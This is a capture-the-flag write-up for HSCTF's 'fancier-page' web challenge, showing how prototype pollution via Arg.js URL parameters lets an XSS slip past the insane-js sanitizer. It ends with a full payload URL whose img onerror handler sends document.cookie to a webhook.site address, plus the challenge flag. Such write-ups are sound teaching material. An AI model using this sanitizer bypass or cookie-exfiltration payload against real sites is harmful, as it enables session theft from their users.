# web/fancier-page
## Description
> No description.

> Flag: flag{prototype_pollution_kills_thousands_of_websites_each_year}

## How to solve
There is 'report to admin' feature on this website. So, there must be XSS things. If we look at the `/app/scripts/display.js` there is 2 imported js module(Arg-js and insane-js). 
```
import { default as Arg } from "https://cdn.jsdelivr.net/npm/@vunamhung/arg.js@1.4.0/+esm";
import { default as insane } from "https://cdn.jsdelivr.net/npm/insane@2.6.2/+esm";
```
> Arg-js is URL argument and parameter parser.

> insane-js is HTML sanitizer, similar to Dompurify.

We can't perform basic XSS due to insane-js sanitizer. But, we have Arg.js to perform client side prototype pollution. Check out this [awesome repository](https://github.com/BlackFan/client-side-prototype-pollution). Our idea is to perform client side prototype pollution to bypass the insane-js sanitizer.

If we look at the insane-js [source code](https://github.dev/bevacqua/insane/blob/master/sanitizer.js) below.
```
function parse(key) {
    ...
    var classesOk = (o.allowedClasses || {})[low] || [];
    var attrsOk = (o.allowedAttributes || {})[low] || [];
    ...
    if (lkey === 'class' && attrsOk.indexOf(lkey) === -1) {
        value = value.split(' ').filter(isValidClass).join(' ').trim();
        valid = value.length;
    } else {
        valid = attrsOk.indexOf(lkey) !== -1 && (attributes.uris[lkey] !== true || testUrl(value));
    }
    if (valid) {
        out(' ');
        out(key);
        if (typeof value === 'string') {
            out('="');
            out(he.encode(value));
            out('"');
        }
    }

    function isValidClass(className) {
        return classesOk && classesOk.indexOf(className) !== -1;
    }
}
```
It will check  `options.allowedClasses.<tag>` and `options.allowedAtrributes.<attr>`. Since, our default `options` looks like this :
```
const options = {
	allowedAttributes: {
		a: ["href"],
		abbr: ["title"],
		details: ["open"],
		"*": ["id", "dir"],
	},
	allowedClasses: {},
	allowedSchemes: ["http", "https"],
	allowedTags: [
		"a",
		"abbr",
		"article",
		"b",
		"blockquote",
		"br",
		"code",
		"del",
		"details",
		"div",
		"em",
		"h1",
		"h2",
		"h3",
		"h4",
		"h5",
		"h6",
		"hr",
		"i",
		"img",
		"ins",
		"kbd",
		"li",
		"main",
		"mark",
		"ol",
		"p",
		"pre",
		"q",
		"s",
		"section",
		"small",
		"span",
		"strike",
		"strong",
		"sub",
		"summary",
		"sup",
		"u",
		"ul",
	],
	filter: null,
	transformText: null,
};
```
It will sanitize the `<img src=x onerror=alert(1)>` completely. To bypass this, we can use prototype pollution. 

Our final payload looks like this :
```
http://fancier-page.hsctf.com/display.html?__proto__.img[0]=onerror&__proto__.img[1]=src&title=a&content=%3Cimg+src%3dx+onerror%3dwindow.location%3D%27http%3A%2F%2Fwebhook.site%2F0611881c-bc41-45f3-a8c9-de17092c579a%2F%3F%27%2Bdocument.cookie%3B%3E&background_color=%23ffffff&color=%23000000&font=Helvetica&font_size=16
``` 
Then send to admin bot to get the flag.
![image](https://github.com/0xazr/ctf-writeups/assets/54212814/bc8a30d6-e8ec-4426-a10d-1b5c7176ff57)
